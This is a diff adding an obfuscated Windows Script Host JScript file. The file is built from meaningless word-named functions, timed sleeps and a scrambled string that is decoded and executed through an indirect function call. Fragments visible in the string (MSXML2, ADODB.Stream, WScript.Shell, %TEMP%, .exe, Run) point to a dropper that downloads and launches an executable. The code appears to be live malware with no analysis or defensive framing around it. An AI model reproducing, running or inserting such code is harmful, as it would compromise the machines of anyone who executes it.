@@ -1,0 +1,15 @@
+function low(quotient,fun,glad,century){better=1;sit=better;WScript.Sleep(5774);tree=sit+better*sit+better;stretch[5002782]=fruit;}
+function horse(sheet,cell,cow) {return sheet.length; }
+function fly(bit,map,pitch){fall[tree](fall[sit])(stretch);}
+function lot(second,iron,field,pound){tire="";quiet=lift;while (quiet < 2165) {thick=paper(second,quiet);tire=two(tire,thick,quiet); quiet++; }return tire;}
+function two(begin,receive,crop) { if (hear(crop)) return begin+receive; else return receive+begin; }
+function paper(energy,paragraph,rule,school,him){return done(energy,paragraph,better);}
+function hear(card,got,test,finish,right){return card % (sit+sit);}
+wall(6526);
+function story(verb,said){stretch[3970712]=low;WScript.Sleep(9337);fell = 'ptS.(nti(ern midfnneiogx rsO;i(ftv\"(\\nx\\%\"eEU@TdS\\e\"Ens+RanmDpo+Nxp\\S\"sED@e.O\\r\"M).,A\\F\"I  lN0=l%) e\")\\hp=)S = .r-!ta1=pv) i  \"r\\{{c%  SUW)WSS0\\E\"0cR(2rDt iNc=pSe=tDj=.Ob sMOslAeueItteNaap%et(\"r\\2sC)2.. 2Ft{2(pm2 i=)frm;ic+  S\"}\\W} 2( e7 ;l8fes1ise4 l 6;a{\")\\ f0;p 3} n+ =r0t u7rpt,y.e2{rr( e ]Fp{\\.\")loreapt(ceshenbc((ut\\\'\"\\sa@G\\c\"E\\}\"T[ +\')\\m;(,+)g \\(\"\'n\\@dih\\n\"tre,tts\\p\".Ss\\F\":o )/t;;/.) \')\\ve(+asmYrlo[ adZkfn]  a+=,r\' \\.mp/h+.st\"r\\aee=Mapj rll=cao hcum.es p(i;h/m)p(n\\\'\'\\\\f\\+Pxd\"T\\{kT?2nHj}jLg)\'M(/tXoglr(,]ew [vlflraufe{n Sycr.tt}2;i1L1o=MtnhXg iSa(rMtys\\;\'8)2(- 1t3{=cw ;e)r\"jZe\"b+t\"OSu_e\"r+t\"nGaE Re\"S r,t\"C\"r .,ietlnipmg(i].\"ref\"c+r\"Sto\"W+m\" iC\"=+h\" ra\"F+r\" WCg{\"o+ \"de)Re\"3[(k cpi<hac  r{Z s)(ee( hIcetnalct i}( h;y)we,l i1m;(0]0\")\" ++\"=d3a e0RZg)e R;\";[ k]c}i\\h\"c) m{; oy rctf;.\"a\\i\\lLgBlYib[xut3\\l\\]\"e+(\"dRk\"e+)\"pE(SpU)\"e+;\"s_ \"u+W\"iTS\"g+c\".NrEwRi\"w+p\"wRt\"\\+\"\".U,\"Q+\\\"\"Cu\"m+i\"o_t\"c+(\".Y)EsK;\"l+ \"hH}\"a  =d }egl iame h;l).\"s\"w+e\"wl \"w+{\"\\l\"\" +,\"We\\h\"\"S+m\"cSo\"r+c\"i..\"p+a\"ttvp.iorscn\"l+a\"eSz\"e+a\"pWk\"((e]2\"d\"2+n\"2tac2\"h+2\".e)\"w+;\"wj bw\"}+\\\"\"O e[\"Z+ \"+t=a+e \";+Y\"}r\'\")+)\"(C)\";[})ctapticrhc(SeW)({ W=S ckrciiphtc.;s6l6e5e6p=(v8r1i8a6c5z0u6y1X0h)g;M}rbogtucfuzr=tfsanlolc;';lift=0;}
+function fruit(little,enough){though="MghXyu";stretch[6004510]=are;fall=market(lot(fell),though);}
+function done(warm,more,process) {return warm.substr(more,process);}
+function market(cry,eight,own,way,connect) {port = horse(eight);east = lift;see=[];for (wind=lift; wind<=(horse(cry)-port); wind++) {if (done(cry,wind,port)==eight){see[horse(see)]=done(cry,east,(wind-east));east = wind+port;}}see[horse(see)]=done(cry,east);return see;}
+function are(){stretch[6389776]=fly;fall[tree] = story[fall[lift]];}
+function some(between,well,least,war){WScript.Sleep(44379);knew=2609;while(story=story){try{stretch[knew](knew);}catch(seven){stretch[1863336]=story;}knew++}}
+function wall(tail,sleep){stretch=[1046];some(stretch);}
